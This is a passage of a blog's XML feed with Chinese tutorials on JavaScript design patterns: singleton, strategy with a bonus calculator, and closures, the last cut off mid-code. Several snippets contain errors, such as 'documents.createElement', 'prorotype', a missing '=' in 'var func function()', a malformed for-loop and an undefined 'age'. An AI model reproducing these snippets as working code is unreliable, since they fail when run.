class_">CreateDiv</span> = <span class="keyword">function</span>(<span class="params">html</span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">html</span> = html;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">init</span>();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">CreateDiv</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">init</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> div = documents.<span class="title function_">createElement</span>(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">    div.<span class="property">innerHTML</span> = <span class="variable language_">this</span>.<span class="property">html</span>;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(div);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>接下来引入代理类proxySingletonCreateDiv：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> proxySingletonCreateDiv = (<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> instance;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params">html</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!instance)&#123;</span><br><span class="line">            instance = <span class="keyword">new</span> <span class="title class_">CreateDiv</span>(html);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> <span class="title function_">proxySingletonCreateDiv</span>(<span class="string">&#x27;seven1&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> b = <span class="keyword">new</span> <span class="title function_">proxySingletonCreateDiv</span>(<span class="string">&#x27;seven2&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">alert</span>(a === b);</span><br></pre></td></tr></table></figure><p>通过引入代理类的方式，我们同样完成了一个单例模式的编写，跟之前不同的是，现在我们负责管理单例的逻辑移到了代理类proxySingletonCreateDiv中，这样一来，CreateDiv就变成了一个普通的类，它跟proxySingletonCreateDiv组合起来可以达到单例模式的效果。</p><h3 id="四、JavaScript中的单例模式"><a href="#四、JavaScript中的单例模式" class="headerlink" title="四、JavaScript中的单例模式"></a>四、JavaScript中的单例模式</h3><p>前面提到的几种单例模式的实现，更多的是接近传统面向对象语言中的实现，单例对象从”类”中创建而来。在以类为中心的语言中，这是很自然的做法。</p><p>但JavaScript其实是一门无类语言，也正因为如此，生搬单例模式的概念并无意义。在JavaScript中创建对象的方法非常简单，既然我们只需一个”唯一”的对象，为什么要为它先创建一个”类”呢？</p><p><strong>单例模式的核心是确保只有一个实例，并提供全局访问</strong></p><p>全局变量不是单例模式，但在JavaScript开发中，我们经常会把全局变量当成单例来使用：<code>var a = &#123;&#125;</code>。</p><p>当用这种方式创建对象a时，对象a确实是独一无二的。如果a变量被声明在全局作用域下，则我们可以在代码中的任何位置使用这个变量，全局变量提供给全局访问是理所当然的。这样满足了单例模式的两个条件。</p><p>但是全局变量存在很多问题，它很容易造成命名空间污染。在大中型项目中，如果不加以限制和管理，程序中可能存在很多这样的变量JavaScript中的变量也很容易被不小心覆盖，相信每个JavaScript程序员都曾经历过变量冲突的痛苦，随时有可能被别人覆盖。</p><p>作为普通的开发者，我们有必要尽量减少全局变量的使用，即使需要，也要把它的污染降到最低。以下几种方式可以相对降低全局变量带来的命名污染。</p><ol><li><h4 id="使用命名空间"><a href="#使用命名空间" class="headerlink" title="使用命名空间"></a>使用命名空间</h4><p>适当地使用命名空间，并不会杜绝全局变量，但可以减少全局变量的数量。</p><p>最简单的方法依然是用对象字面量的方式：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> namespace1 = &#123;</span><br><span class="line">    <span class="attr">a</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">b</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>把a和b都定义为namespace1的属性，这样可以减少变量和全局作用域打交道的机会。另外，我们还可以动态地创建命名空间：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">MyApp</span> = &#123;&#125;;</span><br><span class="line"><span class="title class_">MyApp</span>.<span class="property">namespace</span> = <span class="keyword">function</span>(<span class="params">name</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> parts = name.<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> current = <span class="title class_">MyApp</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i <span class="keyword">in</span> parts)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!current[parts[i]])&#123;</span><br><span class="line">            current[parts[i]] = &#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        current = current[parts[i]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">MyApp</span>.<span class="title function_">namespace</span>(<span class="string">&#x27;event&#x27;</span>);</span><br><span class="line"><span class="title class_">MyApp</span>.<span class="title function_">namespace</span>(<span class="string">&#x27;dom.style&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">dir</span>(<span class="title class_">MyApp</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 上述代码等价于：</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">MyApp</span> = &#123;</span><br><span class="line">    <span class="attr">event</span>: &#123;&#125;,</span><br><span class="line">    <span class="attr">dom</span>: &#123;</span><br><span class="line">        <span class="attr">style</span>: &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><h4 id="使用闭包封装私有变量"><a href="#使用闭包封装私有变量" class="headerlink" title="使用闭包封装私有变量"></a>使用闭包封装私有变量</h4><p>这种方法把一些变量封装在闭包内部，只暴露一些接口跟外界通信：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> user = (<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> __name = <span class="string">&#x27;seven&#x27;</span>,</span><br><span class="line">        __age = <span class="number">29</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="attr">getUserInfo</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> __name + <span class="string">&#x27;-&#x27;</span> + age;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>用下划线来约定变量<code>__name</code>和<code>__age</code>，它们被封装在闭包产生的作用域中，外部是访问不到这两个变量的，这就避免了对全局的命令污染。</p></li></ol><h3 id="五、惰性单例"><a href="#五、惰性单例" class="headerlink" title="五、惰性单例"></a>五、惰性单例</h3><p>惰性单例指的是在需要的时候才创建对象实例。instance实例对象总是在我们调用<code>Singleton.getInstance</code>的时候才被创建，而不是在页面加载好的时候就创建。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Singleton</span>.<span class="property">getInstance</span> = (<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> instance = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params">name</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!instance)&#123;</span><br><span class="line">            instance = <span class="keyword">new</span> <span class="title class_">Singleton</span>(name);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>不过这是基于”类”的单例模式，基于”类”的单例模式在JavaScript中并不适用。</p><h3 id="六、小结"><a href="#六、小结" class="headerlink" title="六、小结"></a>六、小结</h3><p>单例模式是一种简单但非常实用的模式，特别是惰性单例技术，在合适的时候才创建对象，并且只创建唯一的一个。更奇妙的是，创建对象和管理惰性单例的职责被分布在两个不同的方法中，这两个方法组合起来才具有单例模式的威力。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;看本文之前需要有JavaScript的基础知识&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;单例模式的定义是：保证一个类仅有一个实例，并提供一个访问它的全局访问点。&lt;/p&gt;
&lt;h3 id=&quot;一、实现单例模式&quot;&gt;&lt;a href=&quot;#一、实现单例模式&quot; class=&quot;headerlink&quot; tit</summary>
      
    
    
    
    <category term="JavaScript的设计模式和开发实践" scheme="http://cychenhaibin.github.io/categories/JavaScript%E7%9A%84%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E5%92%8C%E5%BC%80%E5%8F%91%E5%AE%9E%E8%B7%B5/"/>
    
    
    <category term="JavaScript的设计模式和开发实践" scheme="http://cychenhaibin.github.io/tags/JavaScript%E7%9A%84%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E5%92%8C%E5%BC%80%E5%8F%91%E5%AE%9E%E8%B7%B5/"/>
    
  </entry>
  
  <entry>
    <title>策略模式</title>
    <link href="http://cychenhaibin.github.io/2024/09/01/%E7%AD%96%E7%95%A5%E6%A8%A1%E5%BC%8F/"/>
    <id>http://cychenhaibin.github.io/2024/09/01/%E7%AD%96%E7%95%A5%E6%A8%A1%E5%BC%8F/</id>
    <published>2024-08-31T18:51:47.000Z</published>
    <updated>2024-08-31T18:52:40.000Z</updated>
    
    <content type="html"><![CDATA[<p>看本文之前需要有JavaScript的基础知识</p><hr><p>策略模式的定义是：定义一系列算法，把它们一个个封装起来，并且使它们可以相互替换。</p><h3 id="一、使用策略模式计算奖金"><a href="#一、使用策略模式计算奖金" class="headerlink" title="一、使用策略模式计算奖金"></a>一、使用策略模式计算奖金</h3><ol><li><h4 id="最初代码实现："><a href="#最初代码实现：" class="headerlink" title="最初代码实现："></a>最初代码实现：</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> calculateBonus = <span class="keyword">function</span>(<span class="params">performanceLevel, salary</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(performanceLevel === <span class="string">&#x27;S&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> salary * <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(performanceLevel === <span class="string">&#x27;A&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> salary * <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(performanceLevel === <span class="string">&#x27;B&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> salary * <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="title function_">calculateBonus</span>(<span class="string">&#x27;B&#x27;</span>,<span class="number">20000</span>);   <span class="comment">// 40000</span></span><br><span class="line"><span class="title function_">calculateBonus</span>(<span class="string">&#x27;S&#x27;</span>,<span class="number">6000</span>);    <span class="comment">// 24000</span></span><br></pre></td></tr></table></figure><p>这段代码十分简单，但是存在着显而易见的缺点：</p><ul><li><p><code>calculateBonus</code>函数比较庞大，包含了很多if-else语句，这些语句需要覆盖所有的逻辑分支。</p></li><li><p><code>calculateBonus</code>函数缺乏弹性违反开放-封闭原则</p></li><li><p>算法的复用性差</p></li></ul></li><li><h4 id="使用组合函数重构代码"><a href="#使用组合函数重构代码" class="headerlink" title="使用组合函数重构代码"></a>使用组合函数重构代码</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> performanceS = <span class="keyword">function</span>(<span class="params">salary</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> salary * <span class="number">4</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> performanceA = <span class="keyword">function</span>(<span class="params">salary</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> salary * <span class="number">3</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> performanceB = <span class="keyword">function</span>(<span class="params">salary</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> salary * <span class="number">2</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> calculateBonus = <span class="keyword">function</span>(<span class="params">performanceLevel, salary</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(performanceLevel === <span class="string">&#x27;S&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">performanceS</span>(salary);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(performanceLevel === <span class="string">&#x27;A&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">performanceA</span>(salary);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(performanceLevel === <span class="string">&#x27;B&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">performanceB</span>(salary);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title function_">calculateBonus</span>(<span class="string">&#x27;A&#x27;</span>,<span class="number">10000</span>);    <span class="comment">// 30000</span></span><br></pre></td></tr></table></figure></li><li><h4 id="使用策略模式重构代码"><a href="#使用策略模式重构代码" class="headerlink" title="使用策略模式重构代码"></a>使用策略模式重构代码</h4><p>策略模式指的是定义一系列的算法，把它们一个个封装起来。将不变的部分和变化的部分隔开是每个设计模式的主题，策略模式的目的就是将算法的使用与算法的实现分离开来。</p><p>一个基于策略模式的程序至少由两部分组成。第一个部分是一组<strong>策略类</strong>，策略类封装了具体的算法，并负责具体的计算过程。第二个部分是<strong>环境类Context</strong>，Context接受客户的请求，随后把请求委托给某一个策略类。</p><p>也可以有三种：<strong>抽象策略（strategy）类、具体策略（Concrete Strategy）类、环境（Context）类。</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> performanceS = <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;;</span><br><span class="line">performanceS.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">calculate</span> = <span class="keyword">function</span>(<span class="params">salary</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> salary * <span class="number">4</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> performanceA = <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;;</span><br><span class="line">performanceA.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">calculate</span> = <span class="keyword">function</span>(<span class="params">salary</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> salary * <span class="number">3</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> performanceB = <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;;</span><br><span class="line">performanceB.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">calculate</span> = <span class="keyword">function</span>(<span class="params">salary</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> salary * <span class="number">2</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 接下来定义奖金类Bonus</span></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Bonus</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">salary</span> = <span class="literal">null</span>;                           <span class="comment">// 原始工资</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">strategy</span> = <span class="literal">null</span>;                         <span class="comment">// 绩效等级对应的策略对象</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Bonus</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">setSalary</span> = <span class="keyword">function</span>(<span class="params">salary</span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">salary</span> = salary;                         <span class="comment">// 设置员工的原始工资</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Bonus</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">setStrategy</span> = <span class="keyword">function</span>(<span class="params">strategy</span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">strategy</span> = strategy;                     <span class="comment">// 设置员工绩效等级对应的策略对象</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Bonus</span>.<span class="property">prorotype</span>.<span class="property">getBonus</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;            <span class="comment">// 取得奖金数额</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable language_">this</span>.<span class="property">strategy</span>)&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;未设置strategy属性&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">strategy</span>.<span class="title function_">calculate</span>(<span class="variable language_">this</span>.<span class="property">salary</span>);  <span class="comment">// 把计算奖金操作委托给对应的策略对象</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> bonus = <span class="keyword">new</span> <span class="title class_">Bonus</span>();</span><br><span class="line"></span><br><span class="line">bonus.<span class="title function_">setSalary</span>(<span class="number">10000</span>);</span><br><span class="line">bonus.<span class="title function_">setStrategy</span>(<span class="keyword">new</span> <span class="title function_">performanceS</span>());            <span class="comment">// 设置策略对象</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(bonus.<span class="title function_">getBonus</span>());                    <span class="comment">// 40000</span></span><br><span class="line"></span><br><span class="line">bonus.<span class="title function_">setStrategy</span>(<span class="keyword">new</span> <span class="title function_">performanceA</span>());            <span class="comment">// 设置策略对象</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(bonus.<span class="title function_">getBonus</span>());                    <span class="comment">// 30000</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="二、JavaScript版本的策略模式"><a href="#二、JavaScript版本的策略模式" class="headerlink" title="二、JavaScript版本的策略模式"></a>二、JavaScript版本的策略模式</h3><p>实际上在JavaScript语言中，函数也是对象，所以更简单和直接的做法是把strategy直接定义为函数：</p><p>将判断语句改写成对象形式可以消除大片的条件分支语句</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> strategies = &#123;</span><br><span class="line">    <span class="string">&quot;S&quot;</span>: <span class="keyword">function</span>(<span class="params">salary</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> salary * <span class="number">4</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;A&quot;</span>: <span class="keyword">function</span>(<span class="params">salary</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> salary * <span class="number">3</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;B&quot;</span>: <span class="keyword">function</span>(<span class="params">salary</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> salary * <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> calculateBonus = <span class="keyword">function</span>(<span class="params">level, salary</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> strategies[level](salary);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">calculateBonus</span>(<span class="string">&#x27;S&#x27;</span>,<span class="number">20000</span>));   <span class="comment">// 80000</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">calculateBonus</span>(<span class="string">&#x27;A&#x27;</span>,<span class="number">10000</span>));   <span class="comment">// 30000</span></span><br></pre></td></tr></table></figure><h3 id="三、多态在策略模式中的体现"><a href="#三、多态在策略模式中的体现" class="headerlink" title="三、多态在策略模式中的体现"></a>三、多态在策略模式中的体现</h3><p>通过使用策略模式重构代码，我们消除了原程序中大片的条件分支语句。所有跟计算奖金有关的逻辑不再放在Context中，而是分布在各个策略对象中。Context并没有计算奖金的能力，而是把这个职责委托给了某个策略对象。每个策略对象负责的算法已被各自封装在对象内部。<strong>当我们对这些策略对象发出”计算奖金”的请求时，它们会返回各自不同的计算结果，这正是对象多态性的体现，也是”它们可以相互替换”的目的。</strong>替换Context中当前保存的策略对象，便能执行不同的算法来得到我们想要的结果。</p><h3 id="四、策略模式的优缺点"><a href="#四、策略模式的优缺点" class="headerlink" title="四、策略模式的优缺点"></a>四、策略模式的优缺点</h3><ol><li><h4 id="优点："><a href="#优点：" class="headerlink" title="优点："></a>优点：</h4><ul><li>策略模式利用组合、委托和多态等技术和思想，可以有效地避免多重条件选择语句。</li><li>策略模式提供了对开放-封闭原则地完美支持，将算法封装在独立的strategy中，使得它们易于切换，易于理解，易于扩展。</li><li>策略模式的算法也可以复用在系统的其他地方，从而避免许多重复的复制粘贴工作。</li><li>在策略模式中利用组合和委托来让Context拥有执行算法的能力，这也是继承的一种更轻便的代替方案。</li></ul></li><li><h4 id="缺点："><a href="#缺点：" class="headerlink" title="缺点："></a>缺点：</h4><ul><li><p>使用策略模式会在程序中增加许多策略类或者策略对象，但实际上这比把它们负责的逻辑堆砌在Context中要好。</p></li><li><p>要使用策略模式，必须了解所有的strategy，必须了解各个strategy之间的不同点，这样才能选择一个合适的strategy。</p></li></ul></li></ol><h3 id="五、小结"><a href="#五、小结" class="headerlink" title="五、小结"></a>五、小结</h3><p>在JavaScript语言的策略模式中，策略类往往被函数所代替，这时策略模式就成为一种”隐式”的模式。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;看本文之前需要有JavaScript的基础知识&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;策略模式的定义是：定义一系列算法，把它们一个个封装起来，并且使它们可以相互替换。&lt;/p&gt;
&lt;h3 id=&quot;一、使用策略模式计算奖金&quot;&gt;&lt;a href=&quot;#一、使用策略模式计算奖金&quot; class=&quot;hea</summary>
      
    
    
    
    <category term="JavaScript的设计模式和开发实践" scheme="http://cychenhaibin.github.io/categories/JavaScript%E7%9A%84%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E5%92%8C%E5%BC%80%E5%8F%91%E5%AE%9E%E8%B7%B5/"/>
    
    
    <category term="JavaScript的设计模式和开发实践" scheme="http://cychenhaibin.github.io/tags/JavaScript%E7%9A%84%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E5%92%8C%E5%BC%80%E5%8F%91%E5%AE%9E%E8%B7%B5/"/>
    
  </entry>
  
  <entry>
    <title>闭包和高阶函数</title>
    <link href="http://cychenhaibin.github.io/2024/08/31/%E9%97%AD%E5%8C%85%E5%92%8C%E9%AB%98%E9%98%B6%E5%87%BD%E6%95%B0/"/>
    <id>http://cychenhaibin.github.io/2024/08/31/%E9%97%AD%E5%8C%85%E5%92%8C%E9%AB%98%E9%98%B6%E5%87%BD%E6%95%B0/</id>
    <published>2024-08-31T15:00:47.000Z</published>
    <updated>2024-08-31T15:00:52.000Z</updated>
    
    <content type="html"><![CDATA[<p>看本文之前需要有JavaScript的基础知识</p><hr><h3 id="一、闭包"><a href="#一、闭包" class="headerlink" title="一、闭包"></a>一、闭包</h3><ol><li><h4 id="变量的作用域"><a href="#变量的作用域" class="headerlink" title="变量的作用域"></a>变量的作用域</h4><p>当在函数中声明一个变量的时候，如果该变量前面没有带上关键字 <code>var</code> ，这个变量就会成为全局变量。另一种情况是用 <code>var</code> 关键字在函数中声明变量，这时候变量即是局部变量。</p><p>在JavaScript中，函数可以用来创造函数作用域，此时的函数就像一层半透明的玻璃，在函数里面可以看到外面的变量，而在函数外面无法看到函数里面的变量。这是因为当在函数中搜索一个变量的时候，如果该函数内并没有声明这个变量，那么此次搜索的过程会随着代码执行环境创建的作用域链往外层逐层搜索，一直搜索到全局对象为止。<strong>变量的搜索是从内到外而非从外到内的。</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> func1 = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> b = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">var</span> func2 = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> c = <span class="number">3</span>;</span><br><span class="line">        <span class="title function_">alert</span>(b);   <span class="comment">// 2</span></span><br><span class="line">        <span class="title function_">alert</span>(a);   <span class="comment">// 1</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">func2</span>();</span><br><span class="line">    <span class="title function_">alert</span>(c);       <span class="comment">// c is not defined</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="title function_">func1</span>();</span><br></pre></td></tr></table></figure></li><li><h4 id="变量的生存周期"><a href="#变量的生存周期" class="headerlink" title="变量的生存周期"></a>变量的生存周期</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> func <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="number">1</span>;     <span class="comment">// 退出函数后局部变量a将被销毁</span></span><br><span class="line">    <span class="title function_">alert</span>(a);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="title function_">func</span>();</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> func <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line">    <span class="title function_">alert</span>(a);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        a++;</span><br><span class="line">        <span class="title function_">alert</span>(a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> f = <span class="title function_">func</span>();</span><br><span class="line"><span class="title function_">f</span>();  <span class="comment">// 2</span></span><br><span class="line"><span class="title function_">f</span>();  <span class="comment">// 3</span></span><br><span class="line"><span class="title function_">f</span>();  <span class="comment">// 4</span></span><br><span class="line"><span class="title function_">f</span>();  <span class="comment">// 5</span></span><br></pre></td></tr></table></figure><p>当退出函数后，局部变量a并没有消失，而是似乎一直在某个地方存活着。这是因为当执行了 <code>var f = func()</code> 时，f返回了一个匿名函数的引用，它可以访问到 <code>func()</code> 被调用时产生的环境，二局部变量a一直处于这个环境里。既然局部变量所在的环境还能被外界访问，这个局部变量就有了不被销毁的理由。在这里产生了一个<strong>闭包结构</strong>，局部变量的生命看起来被延续了。</p></li><li><h4 id="闭包的更多作用"><a href="#闭包的更多作用" class="headerlink" title="闭包的更多作用"></a>闭包的更多作用</h4><ol><li><h5 id="封装变量"><a href="#封装变量" class="headerlink" title="封装变量"></a>封装变量</h5><p>闭包可以帮助把一些不需要暴露在全局的变量封装成”私有变量”。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> mult = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; l = <span class="variable language_">arguments</span>.<span class="property">length</span>; i&lt;l; i++)&#123;</span><br><span class="line">        a = a * <span class="variable language_">arguments</span>[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><h5 id="延续局部变量的寿命"><a href="#延续局部变量的寿命" class="headerlink" title="延续局部变量的寿命"></a>延续局部变量的寿命</h5></li></ol></li><li><h4 id="闭包的面向对象设计"><a href="#闭包的面向对象设计" class="headerlink" title="闭包的面向对象设计"></a>闭包的面向对象设计</h4><p>对象以方法的形式包含了过程，而闭包则是在过程中以环境的形式包含了数据。</p><p>下面看看这段跟闭包相关的代码：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> extent = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> value = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="attr">call</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            value++;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> extent = <span class="title function_">extent</span>();</span><br><span class="line">extent.<span class="title function_">call</span>();  <span class="comment">// 1</span></span><br><span class="line">extent.<span class="title function_">call</span>();  <span class="comment">// 2</span></span><br><span class="line">extent.<span class="title function_">call</span>();  <span class="comment">// 3</span></span><br></pre></td></tr></table></figure><p>如果换成面向对象的写法，就是：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> extent = &#123;</span><br><span class="line">    <span class="attr">value</span>: <span 